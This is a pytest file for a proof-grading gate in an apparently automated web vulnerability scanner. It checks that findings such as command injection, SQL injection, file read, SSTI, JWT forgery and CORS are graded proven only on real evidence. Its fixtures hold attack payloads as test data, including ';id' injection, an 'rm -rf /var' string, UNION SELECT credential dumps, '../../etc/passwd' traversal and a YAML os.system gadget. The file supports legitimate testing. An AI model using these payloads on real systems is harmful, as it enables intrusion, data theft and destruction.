"""The proof matrix: every class, in both directions.

The second direction is the one that matters. A gate that accepts real
evidence is easy; a gate that refuses a plausible-looking claim is the whole
point, and the case that proves it is a benign page that happens to contain
the right-looking string.
"""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from argus import proof
from argus.session import Session


def ex(rid, url, body, status=200, headers=None, method="GET",
       req_headers=None, req_body=None):
    return {"id": rid,
            "request": {"method": method, "url": url,
                        "headers": req_headers or {"host": "t.local"},
                        "body": req_body},
            "response": {"status": status,
                         "headers": headers or {"content-type": "text/html"},
                         "body": body}}


# The page that broke the old gate: no vulnerability of any kind, but it
# carries `uid=1`, a word, and a key-shaped string.
BENIGN = ex("r1", "http://t.local/x",
            "<html><body>Welcome to the shop. uid=1 selected.</body></html>")


def test_every_class_refuses_a_benign_page():
    for name in proof.classes():
        verdict = proof.grade(name, "Welcome", [BENIGN])
        assert verdict.grade in ("unproven", "refused"), \
            f"{name} graded {verdict.grade} on a page with no bug in it"


def test_every_class_names_its_requirement():
    for name in proof.classes():
        spec = proof.spec_for(name)
        assert spec.requirement, name
        if spec.verifier is not proof.verify_refused:
            assert spec.required, f"{name} has no required checks"
        for group in (spec.floor, spec.veto):
            for check in group:
                assert isinstance(check, str) and check, name


def test_scanner_output_is_not_class_evidence():
    event = {"id": "r9", "kind": "external_result",
             "output": "sqlmap identified the following injection point: id"}
    for name in proof.classes():
        if name == "dos":
            continue
        verdict = proof.grade(name, "injection point", [event])
        assert verdict.grade == "unproven"
        assert verdict.missing == ["proof read from the wire"]


def test_unknown_class_is_unproven_and_says_so():
    verdict = proof.grade("probably-bad", "Welcome", [BENIGN])
    assert verdict.grade == "unproven"
    assert "no requirement is defined" in verdict.checks[0]["detail"]


def test_scanner_label_hint():
    verdict = proof.grade("nuclei-match", "Welcome", [BENIGN])
    assert "candidate class" in verdict.checks[0]["detail"]


# --- rce --------------------------------------------------------------------

RCE_PROOF = ex("r2", "http://t.local/ping?host=127.0.0.1;%20id;%20echo%20argusk3m9",
               "PING ok\nuid=33(www-data) gid=33(www-data)\nargusk3m9\n")


def test_rce_proven_by_identity_and_nonce():
    verdict = proof.grade("rce", "uid=33(www-data) gid=33(www-data)", [RCE_PROOF])
    assert verdict.grade == "proven", verdict.explain()


def test_rce_refuses_a_reflection():
    """The trap: a search page echoing the payload produces `uid=` in the
    response without executing anything."""
    refl = ex("r3", "http://t.local/search?q=uid%3D0(root)%20gid%3D0(root);%20id",
              "<html>Results for: uid=0(root) gid=0(root); id</html>")
    verdict = proof.grade("rce", "uid=0(root) gid=0(root)", [refl])
    assert verdict.grade == "unproven"
    assert "reflection" in " ".join(c["detail"] for c in verdict.checks)


def test_rce_veto_on_a_destructive_payload():
    bad = ex("r4", "http://t.local/ping?host=1;%20rm%20-rf%20/var;%20id;%20echo%20argusk3m9",
             "uid=0(root) gid=0(root)\nargusk3m9")
    verdict = proof.grade("rce", "uid=0(root) gid=0(root)", [bad])
    assert verdict.grade == "unproven"
    assert "proof command stayed benign" in verdict.missing


def test_rce_timing_only_is_not_proof():
    blind = ex("r5", "http://t.local/ping?host=127.0.0.1;%20sleep%204", "PING ok")
    assert proof.grade("rce", "PING ok", [blind]).grade == "unproven"


def test_deserialize_declares_a_gadget_not_a_shell_separator():
    """Sharing rce's "a benign command was sent" made deserialize unprovable:
    a serialized payload carries its command inside the gadget."""
    spec = proof.spec_for("deserialize")
    assert "a serialized payload was sent" in spec.required
    assert "a benign command was sent" not in spec.required
    gadget = ex("r40", "http://t.local/import", method="POST",
                req_body='data=!!python/object/apply:os.system '
                         '["id; echo argusk3m9"]',
                body="uid=33(www-data) gid=33(www-data)\nargusk3m9")
    assert proof.grade("deserialization", "uid=33(www-data) gid=33(www-data)",
                       [gadget]).grade == "proven"
    # the rce proof itself is NOT a deserialization proof: no gadget was sent,
    # and the gadget is the floor - a page that merely prints an identity line
    # must not grade this class at all
    assert proof.grade("deserialize", "uid=33(www-data) gid=33(www-data)",
                       [RCE_PROOF]).grade == "unproven"
    assert proof.spec_for("deserialize").floor == (
        "a serialized payload was sent",)


# --- sqli -------------------------------------------------------------------

SQLI_FP = ex("r6", "http://t.local/item?id=1%27",
             "sqlite3.OperationalError: unrecognized token", 500)
SQLI_DUMP = ex("r7", "http://t.local/item?id=1%27%20UNION%20SELECT%20"
                     "username,password%20FROM%20users%20LIMIT%205--%20-",
               "<ul><li>admin - s3cr3t</li><li>alice - pw</li></ul>")


def test_sqli_proven_by_fingerprint_plus_row():
    verdict = proof.grade("sqli", "admin - s3cr3t", [SQLI_FP, SQLI_DUMP])
    assert verdict.grade == "proven", verdict.explain()


def test_sqli_error_only_is_a_candidate():
    """This is the grade the checked-in sample session's F01 actually earns."""
    verdict = proof.grade("sqli", "sqlite3.OperationalError", [SQLI_FP])
    assert verdict.grade == "candidate"
    assert "the query named its target" in verdict.missing
    assert "rows returned, not an error message" in verdict.missing


def test_sqli_dump_without_a_fingerprint_is_a_candidate():
    verdict = proof.grade("sqli", "admin - s3cr3t", [SQLI_DUMP])
    assert verdict.grade == "candidate"
    assert verdict.missing == ["data store fingerprinted"]


def test_sqli_quoting_the_error_fails_the_row_check():
    verdict = proof.grade("sqli", "sqlite3.OperationalError", [SQLI_FP, SQLI_DUMP])
    assert "rows returned, not an error message" in verdict.missing


def test_nosqli_needs_no_fingerprint():
    dump = ex("r8", "http://t.local/api/login",
              '[{"user":"admin"}]', method="POST",
              req_body='{"username":{"$ne":null},"password":{"$ne":null}}')
    assert proof.grade("nosqli", '{"user":"admin"}', [dump]).grade == "proven"


def test_sqli_flags_an_oversized_dump():
    rows = "\n".join(f"<li>user{i} - pw{i}</li>" for i in range(40))
    big = ex("r9", "http://t.local/item?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users",
             rows)
    verdict = proof.grade("sqli", rows, [SQLI_FP, big])
    assert any(c["check"] == "extraction stayed minimal" and not c["ok"]
               for c in verdict.checks)


# --- file read, template, differential --------------------------------------

def test_lfi_needs_a_sentinel_and_a_control():
    hit = ex("r10", "http://t.local/download?file=../../etc/passwd",
             "root:x:0:0:root:/root:/bin/bash\n")
    miss = ex("r11", "http://t.local/download?file=../../etc/nope",
              "not found")
    assert proof.grade("lfi", "root:x:0:0", [hit]).grade == "candidate"
    assert proof.grade("lfi", "root:x:0:0", [hit, miss]).grade == "proven"
    # the control alone: the parameter does take a path, which is the surface,
    # so it is a candidate - but no file came back
    v = proof.grade("lfi", "not found", [miss])
    assert v.grade == "candidate"
    assert "known-file sentinel observed" in v.missing
    # a page that merely QUOTES a passwd line is not a file read at all
    blog = ex("r41", "http://t.local/blog/lfi",
              "<pre>root:x:0:0:root:/root:/bin/bash</pre>")
    assert proof.grade("lfi", "root:x:0:0", [blog]).grade == "unproven"


def test_ssti_needs_two_operand_pairs():
    """One product can be a coincidence in the page: `{{2*2}}` plus "Showing 4
    results" graded proven. Two different pairs cannot both land by accident.
    """
    done = ex("r12", "http://t.local/hello?name=%7B%7B7*7%7D%7D", "Hello 49")
    second = ex("r14", "http://t.local/hello?name=%7B%7B3*5%7D%7D", "Hello 15")
    echo = ex("r13", "http://t.local/hello?name=%7B%7B7*7%7D%7D", "Hello {{7*7}}")
    assert proof.grade("ssti", "Hello 49", [done]).grade == "candidate"
    assert proof.grade("ssti", "Hello 49", [done, second]).grade == "proven"
    assert proof.grade("ssti", "Hello {{7*7}}", [echo]).grade == "unproven"
    # the coincidence the audit demonstrated
    coincide = ex("r15", "http://t.local/p?name=%7B%7B2*2%7D%7D",
                  "<html>Showing 4 results</html>")
    assert proof.grade("ssti", "Showing 4 results", [coincide]).grade == "candidate"


def test_idor_needs_two_subjects_and_a_difference():
    mine = ex("r14", "http://t.local/api/user/1", '{"id":1,"username":"me"}')
    theirs = ex("r15", "http://t.local/api/user/2", '{"id":2,"username":"admin"}')
    # one unauthenticated request returning a user record IS a real signal -
    # what it is missing is the second id on the same endpoint
    one = proof.grade("idor", '"username":"admin"', [theirs])
    assert one.grade == "candidate"
    assert "two distinct object references on one endpoint" in one.missing
    assert proof.grade("idor", '"username":"admin"',
                       [mine, theirs]).grade == "proven"
    # the boilerplate case: the quoted bytes are in both responses, so the
    # difference is the page and not the identity - the floor check fails and
    # nothing above unproven is available
    assert proof.grade("idor", '"username"', [mine, theirs]).grade == "unproven"


FORGE_EVENT = {"id": "e1", "kind": "jwt_forge",
               "claims_set": {"role": "admin"},
               "token_sha256_16": {"resigned": "0123456789abcdef"}}


def test_jwt_needs_the_mint_and_the_rejected_control():
    """A good credential accepted and a bad one refused is an authorisation
    system working. What separates it from a forgery is that this system
    minted the accepted credential, which `jwt_forge` now records."""
    forged = ex("r16", "http://t.local/api/me", '{"role":"admin"}', 200,
                req_headers={"authorization": "Bearer forged"})
    bad = ex("r17", "http://t.local/api/me", "invalid signature", 401,
             req_headers={"authorization": "Bearer wrong"})
    # no mint on record: this is indistinguishable from a working auth check
    assert proof.grade("jwt", '{"role":"admin"}', [forged, bad]).grade == "unproven"
    v = proof.grade("jwt", '{"role":"admin"}', [forged, bad, FORGE_EVENT])
    assert v.grade == "proven", v.explain()
    # the mint alone, with no control, is a candidate
    assert proof.grade("jwt", '{"role":"admin"}',
                       [forged, FORGE_EVENT]).grade == "candidate"


def test_jwt_unproven_when_the_cited_request_carries_no_credential():
    """The sample session's F05 cites /api/user/1, which sends no token."""
    none = ex("r18", "http://t.local/api/user/1", '{"role": "admin"}')
    verdict = proof.grade("jwt", '"role": "admin"', [none])
    assert verdict.grade == "unproven"
    assert "a forged credential was accepted" in verdict.missing


def test_open_redirect_reads_the_location_header():
    off = ex("r19", "http://t.local/redirect?next=http://evil.test/",
             "", 302, headers={"location": "http://evil.test/"})
    home = ex("r20", "http://t.local/redirect?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [off]).grade == "candidate"
    assert proof.grade("open-redirect", "", [off, home]).grade == "proven"


def test_cache_poisoning_needs_both_halves():
    poison = ex("r21", "http://t.local/cached", "ok",
                req_headers={"x-forwarded-host": "evil.test"})
    victim = ex("r22", "http://t.local/cached",
                "<link href='http://evil.test/a.css'>")
    assert proof.grade("cache", "evil.test", [victim]).grade == "unproven"
    assert proof.grade("cache-poisoning", "evil.test",
                       [poison, victim]).grade == "proven"


def test_cors_requires_credentials_to_matter():
    reflect = ex("r23", "http://t.local/api/data", "{}", 200,
                 headers={"access-control-allow-origin": "http://evil.test"},
                 req_headers={"origin": "http://evil.test"})
    creds = ex("r24", "http://t.local/api/data", "{}", 200,
               headers={"access-control-allow-origin": "http://evil.test",
                        "access-control-allow-credentials": "true"},
               req_headers={"origin": "http://evil.test"})
    assert proof.grade("cors", "{}", [reflect]).grade == "candidate"
    assert proof.grade("cors", "{}", [creds]).grade == "proven"


def test_disclosure_wants_a_credential_shape():
    env = ex("r25", "http://t.local/.env", "SECRET_KEY=lab-secret-0123\n")
    assert proof.grade("info-disclosure", "SECRET_KEY=lab-secret-0123",
                       [env]).grade == "proven"
    assert proof.grade("disclosure", "lab", [env]).grade == "unproven"


def test_xss_cannot_exceed_candidate_without_a_browser():
    refl = ex("r26", "http://t.local/search?q=x%3C%3E%27%22",
              "<html><body>Results for: x<>'\"</body></html>", 200,
              headers={"content-type": "text/html; charset=utf-8"})
    verdict = proof.grade("xss", "x<>'\"", [refl])
    assert verdict.grade == "candidate"
    assert verdict.missing == ["a real browser executed it"]
    enc = ex("r27", "http://t.local/search?q=x%3C%3E",
             "<html><body>Results for: x&lt;&gt;</body></html>", 200,
             headers={"content-type": "text/html"})
    assert proof.grade("xss", "x&lt;&gt;", [enc]).grade == "unproven"


def test_dos_is_refused_outright():
    verdict = proof.grade("dos", "anything", [BENIGN])
    assert verdict.grade == "refused"
    assert "the proof is the damage" in verdict.checks[0]["detail"]


# --- the class vocabulary ---------------------------------------------------

@pytest.mark.parametrize("spelling", ["sqli", "SQLi", "sql-injection",
                                      "SQL Injection", "sqlinjection"])
def test_canonical_folds_spellings(spelling):
    assert proof.canonical(spelling) == "sqli"


def test_canonical_keeps_an_unknown_class_readable():
    assert proof.canonical("Weird Bug") == "weird-bug"


def test_requirement_lookup():
    assert "id; echo" in proof.requirement_of("command-injection")
    assert proof.requirement_of("not-a-class") == ""


def test_grade_never_raises_on_a_mangled_entry():
    for bad in ([{"id": "r1", "response": "not a dict"}],
                [{"id": "r1"}], [None], [], None):
        assert proof.grade("sqli", "x", bad).grade in ("unproven", "candidate")


# --- the recorder ------------------------------------------------------------

def _sess(tmp_path, **kw):
    return Session(tmp_path, "http://t.local", meta={}, **kw)


def test_finding_carries_its_grade(tmp_path):
    s = _sess(tmp_path)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    f = s.add_finding("sqli", "high", "SQL Injection", "http://t.local/item?id=1",
                      [rid], "sqlite3.OperationalError", "d", "r")
    assert f["vuln_class"] == "sqli"
    assert f["grade"] == "candidate"
    assert "the query named its target" in f["proof"]["missing"]


def test_better_evidence_upgrades_in_place(tmp_path):
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/item?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1", [r1],
                  "sqlite3.OperationalError", "d", "r")
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/item?id=1' UNION SELECT "
                                 "username,password FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    f = s.add_finding("sqli", "critical", "sqli", "http://t.local/item?id=1",
                      [r1, r2], "admin - s3cr3t", "dumped", "bind params")
    assert f["id"] == "F01" and f["grade"] == "proven"
    assert f["upgraded_from"] == "candidate"
    assert f["severity"] == "critical"
    assert len(s.findings) == 1
    # the same or weaker evidence is still a duplicate
    with pytest.raises(ValueError, match="duplicate of F01"):
        s.add_finding("again", "high", "sql-injection", "http://t.local/item?id=1",
                      [r1], "sqlite3.OperationalError", "d", "r")


def test_dedup_folds_class_spellings(tmp_path):
    """Two workers naming one bug differently recorded it twice."""
    s = _sess(tmp_path)
    rid = s.record_exchange("t", {"method": "GET", "url": "http://t.local/i"},
                            {"status": 200, "headers": {}, "body": "proof"})
    s.add_finding("a", "high", "sqli", "http://t.local/i?id=1", [rid],
                  "proof", "d", "r")
    with pytest.raises(ValueError, match="duplicate"):
        s.add_finding("b", "high", "SQL-Injection", "http://t.local/i?id=1",
                      [rid], "proof", "d", "r")


def test_require_proof_refuses_a_candidate(tmp_path):
    s = _sess(tmp_path, require_proof=True)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    with pytest.raises(ValueError, match="require-proof"):
        s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1", [rid],
                      "sqlite3.OperationalError", "d", "r")
    assert s.findings == []


def test_require_proof_accepts_what_is_proven(tmp_path):
    s = _sess(tmp_path, require_proof=True)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/item?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/item?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    f = s.add_finding("sqli", "critical", "sqli", "http://t.local/item?id=1",
                      [r1, r2], "admin - s3cr3t", "d", "r")
    assert f["grade"] == "proven"


# --- the classes a wrong requirement made unprovable ------------------------

def test_header_acl_bypass_is_graded_as_access_control_not_caching():
    """xfh and host-header used to be aliased onto the cache-poisoning spec,
    so the lab's own `X-Original-URL: /admin` bypass graded unproven under a
    requirement about caches."""
    denied = ex("r30", "http://t.local/admin", "Forbidden", 403)
    served = ex("r31", "http://t.local/admin",
                "<h1>Admin panel</h1> user list", 200,
                req_headers={"x-original-url": "/admin"})
    assert proof.canonical("xfh") == "xfh"
    assert proof.grade("xfh", "<h1>Admin panel</h1>",
                       [denied, served]).grade == "proven"
    # the bypass alone is a candidate: nothing shows the resource was restricted
    assert proof.grade("host-header", "<h1>Admin panel</h1>",
                       [served]).grade == "candidate"
    # a control on a different path does not prove THIS path was restricted
    elsewhere = ex("r32", "http://t.local/other", "<h1>Admin panel</h1>", 200,
                   req_headers={"x-original-url": "/admin"})
    assert proof.grade("xfh", "<h1>Admin panel</h1>",
                       [denied, elsewhere]).grade == "candidate"
    assert proof.grade("xfh", "Welcome", [BENIGN]).grade == "unproven"


def test_each_mechanism_has_its_own_class():
    """Aliasing distinct mechanisms onto one class makes them share a dedup
    key, so the second genuine finding on an endpoint is refused as a
    duplicate of the first. Smuggling is not cache poisoning - different
    mechanism, different CWE - and an ACL bypass is neither."""
    assert proof.canonical("cache-poisoning") == "cache"
    assert proof.canonical("web-cache-deception") == "cache"
    assert proof.canonical("request-smuggling") == "smuggle"
    assert proof.canonical("x-original-url") == "xfh"
    assert proof.canonical("mass-assignment") == "massassign"
    assert proof.canonical("prototype-pollution") == "ppoll"
    assert proof.canonical("race-condition") == "race"
    from argus.session import _cwe_of
    assert _cwe_of("cache") != _cwe_of("smuggle")
    assert _cwe_of("xfh") != _cwe_of("smuggle")


# --- a refused class is not a finding ---------------------------------------

def test_a_refused_class_cannot_be_recorded(tmp_path):
    """The matrix does not say the dos evidence is thin, it says the system
    does not prove the class. Keeping a `critical` dos finding on file was the
    assertion-instead-of-proof the gate exists to stop."""
    s = _sess(tmp_path)
    rid = s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                            {"status": 200, "headers": {}, "body": "slow"})
    with pytest.raises(ValueError, match="refused class"):
        s.add_finding("thread exhaustion", "critical", "dos",
                      "http://t.local/x", [rid], "slow", "d", "r")
    with pytest.raises(ValueError, match="refused class"):
        s.add_finding("slowloris", "high", "resource-exhaustion",
                      "http://t.local/x", [rid], "slow", "d", "r")
    assert s.findings == []


# --- identifiers -------------------------------------------------------------

def test_every_class_maps_to_a_cwe():
    from argus.session import _cwe_of
    unmapped = [c for c in proof.classes() if not _cwe_of(c)]
    assert unmapped == [], f"no CWE for {unmapped}"


def test_rce_carries_cwe_and_owasp(tmp_path):
    """The headline acceptance class was the one with no identifiers."""
    from argus.session import _cwe_of, _owasp_of
    assert _cwe_of("rce") == "CWE-78"
    assert _owasp_of("CWE-78")
    s = _sess(tmp_path)
    rid = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/ping?host=127.0.0.1;%20id;%20echo%20argusk3m9"},
        {"status": 200, "headers": {},
         "body": "uid=33(www-data) gid=33(www-data)\nargusk3m9"})
    f = s.add_finding("cmdi", "critical", "command-injection",
                      "http://t.local/ping", [rid],
                      "uid=33(www-data) gid=33(www-data)", "d", "r")
    assert f["grade"] == "proven"
    assert f["cwe"] == "CWE-78" and f["owasp"]


def test_xfh_no_longer_claims_the_smuggling_cwe():
    from argus.session import _cwe_of
    assert _cwe_of("xfh") == "CWE-290"
    assert _cwe_of("smuggle") == "CWE-444"


# --- tamper-evidence over the grade -----------------------------------------

def test_verify_detects_an_inflated_grade(tmp_path):
    """findings.json is operator-editable. Raising a stored grade makes the
    claim stronger with no new evidence; the grade is recomputed from the
    chained transcript, so the claim has to hold against it."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    f = s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1",
                      [rid], "sqlite3.OperationalError", "d", "r")
    assert f["grade"] == "candidate"
    entries = {rid: s.get_exchange(rid)}
    assert findings_overgraded(entries, s.findings) == []
    inflated = [{**f, "grade": "proven"}]
    rows = findings_overgraded(entries, inflated)
    assert rows and rows[0]["claimed"] == "proven"
    assert rows[0]["evidence_supports"] == "candidate"
    assert rows[0]["missing"]


def test_a_weaker_stored_grade_is_not_a_tamper_signal(tmp_path):
    """A requirement loosening later must not retroactively condemn a session."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/ping?host=1;%20id;%20echo%20argusk3m9"},
        {"status": 200, "headers": {},
         "body": "uid=0(root) gid=0(root)\nargusk3m9"})
    f = s.add_finding("rce", "critical", "rce", "http://t.local/ping", [rid],
                      "uid=0(root) gid=0(root)", "d", "r")
    assert f["grade"] == "proven"
    understated = [{**f, "grade": "candidate"}]
    assert findings_overgraded({rid: s.get_exchange(rid)}, understated) == []


def test_legacy_findings_without_a_grade_are_skipped():
    from argus.session import findings_overgraded
    assert findings_overgraded({}, [{"id": "F01", "severity": "high"}]) == []
    assert findings_overgraded({}, ["not a dict", None]) == []


# --- the renderers tell the same story --------------------------------------

def test_sanitized_findings_survives_a_hand_edited_proof_block():
    from argus.session import sanitized_findings
    rows = sanitized_findings([
        {"id": "F01", "severity": "high", "grade": 123, "proof": "not a dict"},
        {"id": "F02", "proof": {"checks": "nope", "missing": 5,
                                "requirement": None}},
    ])
    assert rows[0]["proof"] == {}
    assert rows[0]["grade"] == "123"
    assert rows[1]["proof"]["checks"] == [] and rows[1]["proof"]["missing"] == []

def test_no_spec_declares_a_check_its_verifier_never_emits():
    """A renamed check leaves the spec pointing at a name nothing produces.
    The grade then depends on a check that can never pass, so the class is
    silently unprovable - which is how `cors` lost its floor during a rename
    and graded every claim unproven.
    """
    rich = [
        ex("w1", "http://t.local/x?file=../../etc/passwd",
           "root:x:0:0:root:/root:/bin/bash"),
        ex("w2", "http://t.local/admin", "Forbidden", 403),
        ex("w3", "http://t.local/p?n=%7B%7B7*7%7D%7D", "49"),
        ex("w4", "http://t.local/api/me", '{"role":"admin","username":"a"}',
           200, req_headers={"host": "t.local", "authorization": "Bearer x",
                             "origin": "http://evil.test"}),
        ex("w5", "http://t.local/go", "", 302,
           headers={"location": "http://evil.test/"}),
        ex("w6", "http://t.local/w", "ok", 200, method="POST",
           req_body="role=admin"),
    ]
    orphans = {}
    for name in proof.classes():
        spec = proof.spec_for(name)
        if spec.verifier is proof.verify_refused:
            continue
        produced = set()
        for subset in ([], rich, rich[:1], rich[:2]):
            checks = spec.verifier(proof.Claim("root:x:0:0", subset), spec)
            produced |= {c["check"] for c in checks}
        declared = (set(spec.required) | set(spec.veto) | set(spec.floor)
                    | set(spec.advisories))
        missing = sorted(declared - produced)
        if missing:
            orphans[name] = missing
    assert not orphans, f"specs declare checks nothing emits: {orphans}"


def test_every_class_states_what_it_cannot_settle():
    """A class capped at `candidate` must say so in its requirement, because
    the cap is the honest answer and a reader has to be able to see it."""
    for name in proof.classes():
        spec = proof.spec_for(name)
        if spec.ceiling != "candidate":
            continue
        text = (spec.requirement + " " + spec.notes).lower()
        assert any(w in text for w in ("candidate", "browser", "collector",
                                       "this system", "stops at", "measures",
                                       "needs a")), \
            f"{name} is capped at candidate without saying why: {spec.requirement}"


# --- the bypasses an adversarial audit demonstrated, kept closed -----------
#
# Every case below graded `proven` once, on evidence containing no
# vulnerability at all. They are the regression net for the structural fix:
# a check that scans the whole cited set independently is not a proof, because
# the conjunction can be satisfied by combining unrelated exchanges.

def test_rce_cannot_be_assembled_from_two_exchanges():
    """Cite a request that sent `id` and got nothing, plus an unrelated debug
    page that prints an identity line. Each check passed somewhere; nothing
    was executed anywhere."""
    sent = ex("b1", "http://t.local/ping?host=aaaaaa;%20id",
              "<html>PING aaaaaa: 4 packets</html>")
    elsewhere = ex("b2", "http://t.local/debug",
                   "<html><pre>uid=33(www-data) gid=33(www-data)</pre></html>")
    v = proof.grade("rce", "uid=33(www-data) gid=33(www-data)",
                    [sent, elsewhere])
    assert v.grade == "unproven", v.explain()
    assert "identity output returned by the target" in v.missing


def test_rce_nonce_must_be_the_one_this_system_sends():
    """"any 6-32 char token present in both the request and the response" made
    every page that echoes a parameter carry a valid nonce."""
    echo = ex("b3", "http://t.local/ping?host=aaaaaa;%20id",
              "PING aaaaaa\nuid=0(root) gid=0(root)\n")
    v = proof.grade("rce", "uid=0(root) gid=0(root)", [echo])
    assert "the probe nonce came back in the output" in v.missing
    real = ex("b4", "http://t.local/ping?host=1;%20id;%20echo%20argus7k2m9x",
              "uid=0(root) gid=0(root)\nargus7k2m9x\n")
    assert proof.grade("rce", "uid=0(root) gid=0(root)", [real]).grade == "proven"


def test_sqli_not_proven_by_the_english_word_from():
    """req_text unquote_plus-es the request, so `?q=mail+from+bob` became
    "mail from bob" and named the table `bob`. An ordinary search box satisfied
    "the query named its target", and a page mentioning a database satisfied
    the fingerprint."""
    page = ex("b5", "http://t.local/search?q=mail+from+bob",
              "<html>We moved to PostgreSQL in 2019. "
              "Results: <li>alice - note</li></html>")
    v = proof.grade("sqli", "alice - note", [page])
    assert v.grade == "candidate", v.explain()
    assert "the query named its target" in v.missing
    for benign in ("GET /flights?from=london&to=paris",
                   'POST /t {"from":"alice","to":"bob"}',
                   "GET /p?ref=news+from+paris"):
        assert not proof.TABLE_RE.search(
            __import__("urllib.parse", fromlist=["parse"]).unquote_plus(benign)), benign


def test_difference_only_classes_cannot_reach_proven():
    """verify_generic is `_discriminates` alone - true of any two pages on any
    site - and it graded seven classes proven."""
    a = ex("b6", "http://t.local/a", "<html>Page A unique</html>")
    b = ex("b7", "http://t.local/b", "<html>Page B different</html>")
    # lockout left this set: its artifact is the ABSENCE of a difference, and
    # being graded by `_discriminates` inverted it
    for name in ("ssrf", "enum", "crlf", "upload", "method",
                 "websocket", "race"):
        v = proof.grade(name, "Page A unique", [a, b])
        assert v.grade == "candidate", f"{name} graded {v.grade}"
        assert proof.spec_for(name).ceiling == "candidate"


def test_jwt_needs_the_same_endpoint_and_a_different_credential():
    """Any Cookie-bearing 2xx plus any 401 anywhere graded jwt proven - and
    every browser-shaped request carries a Cookie."""
    api = ex("b8", "http://t.local/api/me", '{"role":"admin"}', 200,
             req_headers={"cookie": "session=abc"})
    logout = ex("b9", "http://t.local/logout", "unauthorized", 401)
    assert proof.grade("jwt", '{"role":"admin"}',
                       [api, logout, FORGE_EVENT]).grade != "proven"
    same = ex("b10", "http://t.local/api/me", "invalid signature", 401,
              req_headers={"cookie": "session=tampered"})
    assert proof.grade("jwt", '{"role":"admin"}',
                       [api, same, FORGE_EVENT]).grade == "proven"


def test_idor_is_not_pagination():
    """`/page/1` and `/page/2` differ, so they graded broken access control."""
    p1 = ex("b11", "http://t.local/page/1", "<html>Articles page 1: alpha</html>")
    p2 = ex("b12", "http://t.local/page/2", "<html>Articles page 2: beta</html>")
    assert proof.grade("idor", "page 2: beta", [p1, p2]).grade == "unproven"
    mine = ex("b13", "http://t.local/api/user/1", '{"id":1,"username":"me"}')
    theirs = ex("b14", "http://t.local/api/user/2",
                '{"id":2,"username":"admin","email":"a@b.c"}')
    assert proof.grade("idor", '"username":"admin"',
                       [mine, theirs]).grade == "proven"


def test_disclosure_ignores_placeholder_credentials():
    """An install document full of `password=changeme` graded proven."""
    doc = ex("b15", "http://t.local/install.md",
             "<pre>password=changeme\napi_key=YOUR_KEY_HERE\n"
             "token=${TOKEN}</pre>")
    for quote in ("password=changeme", "api_key=YOUR_KEY_HERE", "token=${TOKEN}"):
        assert proof.grade("disclosure", quote, [doc]).grade == "unproven", quote
    real = ex("b16", "http://t.local/.env", "SECRET_KEY=lab-secret-0123\n")
    assert proof.grade("disclosure", "SECRET_KEY=lab-secret-0123",
                       [real]).grade == "proven"


def test_redirect_needs_the_destination_to_come_from_the_request():
    """An apex-to-www hop is off origin too, and graded as the finding."""
    apex = ex("b17", "http://t.local/go", "", 302,
              headers={"location": "https://www.t.local/"})
    assert proof.grade("redirect", "", [apex]).grade == "unproven"
    supplied = ex("b18", "http://t.local/go?next=http://evil.test/", "", 302,
                  headers={"location": "http://evil.test/"})
    home = ex("b19", "http://t.local/go?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [supplied, home]).grade == "proven"


def test_cors_allowlist_working_is_not_a_finding():
    """The verifier never compared the Origin with the request's own host, so
    a correct allowlist echoing the site's origin graded proven."""
    own = ex("b20", "http://t.local/api/data", "{}", 200,
             headers={"access-control-allow-origin": "http://t.local",
                      "access-control-allow-credentials": "true"},
             req_headers={"origin": "http://t.local"})
    assert proof.grade("cors", "{}", [own]).grade == "unproven"
    foreign = ex("b21", "http://t.local/api/data", "{}", 200,
                 headers={"access-control-allow-origin": "http://evil.test",
                          "access-control-allow-credentials": "true"},
                 req_headers={"origin": "http://evil.test"})
    assert proof.grade("cors", "{}", [foreign]).grade == "proven"


def test_csrf_needs_a_tokenless_cross_origin_write():
    """Any GET plus any POST plus any difference graded csrf - that is a web
    site, not a finding."""
    before = ex("b22", "http://t.local/settings", "<p>email: old@x.test</p>")
    write = ex("b23", "http://t.local/settings/update-email", "ok", 200,
               method="POST", req_body="email=new@evil.test")
    after = ex("b24", "http://t.local/settings", "<p>email: new@evil.test</p>")
    assert proof.grade("csrf", "new@evil.test",
                       [before, write, after]).grade != "proven"
    cross = ex("b25", "http://t.local/settings/update-email", "ok", 200,
               method="POST", req_body="email=new@evil.test",
               req_headers={"origin": "http://evil.test"})
    assert proof.grade("csrf", "new@evil.test",
                       [before, cross, after]).grade == "proven"
    tokened = ex("b26", "http://t.local/settings/update-email", "ok", 200,
                 method="POST",
                 req_body="email=new@evil.test&csrf_token=abc",
                 req_headers={"origin": "http://evil.test"})
